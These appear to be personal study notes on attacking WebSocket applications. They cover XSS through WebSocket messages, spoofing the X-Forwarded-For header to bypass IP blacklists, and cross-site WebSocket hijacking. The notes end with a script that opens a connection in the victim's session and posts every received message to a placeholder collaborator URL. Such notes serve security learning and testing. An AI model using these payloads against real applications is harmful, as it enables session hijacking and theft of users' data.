# WebSockets
Virtually any web security vulnerability that arises with regular HTTP can also arise in relation to WebSockets communications.  
We can exploit any vulns in websocket context:
```
{"message":"Hello Carlos"}
```
This websocket message is then renderred:
```
<td>Hello Carlos</td>
```
So we can do next:
```
{"message":"<img src=1 onerror='alert(1)'>"}
```
## Manipulating the WebSocket handshake to exploit vulnerabilities
* Misplaced trust in HTTP headers to perform security decisions, such as the X-Forwarded-For header. 
* Flaws in session handling mechanisms, since the session context in which WebSocket messages are processed is generally determined by the session context of the handshake message
* Attack surface introduced by custom HTTP headers used by the application
We can spoof our conenction IP when resending request to connect to websocket with `X-Forwarded-For` header to bypass blacklisting mechanism  
## Cross-site websocket hijacking
CSWH ois a CSRF on WebSocket handshake  
 An attacker can create a malicious web page on their own domain which establishes a cross-site WebSocket connection to the vulnerable application. The application will handle the connection in the context of the victim user's session with the application.  

The attacker's page can then send arbitrary messages to the server via the connection and read the contents of messages that are received back from the server. This means that, unlike regular CSRF, the attacker gains two-way interaction with the compromised application.  
To detect possibly vulnerable websocket conenctions, we need to look for websocket conenctions which aren't protected from CSRF attacks, so that aren't using any aadditional unpredictable tokens accept cookies.  
We can sue such script on our exploit server to receive websocket connections:
```
<script>
    var ws = new WebSocket('wss://your-websocket-url');
    ws.onopen = function() {
        ws.send("READY");
    };
    ws.onmessage = function(event) {
        fetch('https://your-collaborator-url', {method: 'POST', mode: 'no-cors', body: event.data});
    };
</script>
```
And send it to victim  
